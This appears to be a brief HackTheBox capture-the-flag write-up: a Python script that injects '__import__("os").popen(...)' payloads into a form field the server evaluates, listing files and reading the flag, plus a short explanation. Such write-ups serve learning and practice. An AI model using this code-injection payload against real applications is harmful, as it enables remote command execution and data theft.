# HackTheBox Challenge Baby International Internet

tags: #python #deserialization 

```python

#!/usr/bin/python3 
    
import requests 

proxy = {
        'http': 'http://127.0.0.1:8080'
}

#data = {'ingredient': 'test', 'measurements': '1337'}
#data = {'ingredient': 'test', 'measurements': '__import__("os").popen("ls").read()'}
data = {'ingredient': 'test', 'measurements': '__import__("os").popen("cat flag").read()'}
addr = 'http://157.245.33.77:30357'
r = requests.post(addr, data=data, proxies=proxy)
    
print(r.content)

```

We learn from the /debug page that we can input 2 values.  The ingredient creates the name of the variable and then the measurements is the number or calculation that is calculated.  By manipulating the measurements to python code that can be executed.

